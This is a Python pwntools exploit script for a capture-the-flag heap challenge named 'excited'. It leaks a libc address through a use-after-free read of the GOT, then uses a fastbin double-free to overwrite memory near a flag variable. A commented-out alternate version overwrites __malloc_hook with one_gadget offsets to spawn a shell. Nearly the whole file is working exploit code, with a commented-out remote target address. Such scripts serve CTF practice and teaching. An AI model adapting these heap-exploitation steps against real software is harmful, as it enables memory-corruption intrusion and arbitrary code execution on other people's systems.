#! /usr/bin/python

from pwn import *
from LibcSearcher import *

p = process('./excited')
#p = remote('123.56.85.29',6484)
elf = ELF('./excited')
#libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
context.log_level = 'debug'

def menu(choice):
	p.recvuntil('Now please tell me what you want to do :')
	p.sendline(str(choice))

def add(ba_size,ba_content,na_size,na_content):
	menu(1)
	p.recvuntil("> ba's length : ")
	p.sendline(str(ba_size))
	p.recvuntil("> ba :")
	p.sendline(ba_content)
	p.recvuntil("> na's length : ")
	p.sendline(str(na_size))
	p.recvuntil("> na :")
	p.sendline(na_content)

def delete(idx):
	menu(3)
	p.recvuntil('> Banana ID : ')
	p.sendline(str(idx))

def view(idx):
	menu(4)
	p.recvuntil('> Banana ID : ')
	p.sendline(str(idx))

read_got = elf.got['read']
flag = 0x06020A0 - 0x8


###leak libc###
add(0x50,'aaaa',0x50,'bbbb')#0
add(0x50,'cccc',0x50,'dddd')#1

delete(0)
delete(1)

add(0x10,p64(read_got),0x60,'dddd')#2
view(0)
p.recvuntil("ba is ")
read = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
libc = LibcSearcher('read',read)

delete(2)
add(0x50,'aaaa',0x50,'bbbb')#3
add(0x50,'aaaa',0x50,'bbbb')#4

###fastbin attack###
libc_base = read - libc.dump('read')
realloc = libc_base + libc.dump('__libc_realloc')
malloc_hook = libc_base + libc.dump('__malloc_hook')
#fake_chunk = malloc_hook - 0x23

libc_one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]
one_gadget = libc_base + libc_one_gadget[2]

add(0x50,'aaaa',0x50,'bbbb')#5


delete(4)
delete(5)
delete(4)


add(0x50,p64(flag),0x50,p64(flag))#6
add(0x50,'cccc',0x70,'dddd')#7
add(0x50,'aaaa',0x50,'a')
#gdb.attach(p)
###get shell###
view(8)
p.interactive()





'''
###leak libc###
add(0x60,'aaaa',0x60,'bbbb')#0
add(0x60,'cccc',0x60,'dddd')#1

delete(0)
delete(1)

add(0x10,p64(read_got),0x60,'dddd')#2
view(0)
p.recvuntil("ba is ")
read = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
libc = LibcSearcher('read',read)

delete(2)
add(0x60,'aaaa',0x60,'bbbb')#3
add(0x60,'aaaa',0x60,'bbbb')#4


###fastbin attack###
libc_base = read - libc.dump('read')
realloc = libc_base + libc.dump('__libc_realloc')
malloc_hook = libc_base + libc.dump('__malloc_hook')
fake_chunk = malloc_hook - 0x23
libc_one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]
one_gadget = libc_base + libc_one_gadget[1]

add(0x60,'aaaa',0x60,'bbbb')#5

delete(4)
delete(5)
delete(4)


add(0x60,p64(fake_chunk),0x60,p64(fake_chunk))#6
add(0x60,'cccc',0x70,'dddd')#7

payload = 'A' * (0x13-0x8) + p64(one_gadget) + p64(realloc+13)
#payload = 'A' * 0x13 + p64(one_gadget)
add(0x60,payload,0x60,payload)#8
'''
###getshell###
p.interactive()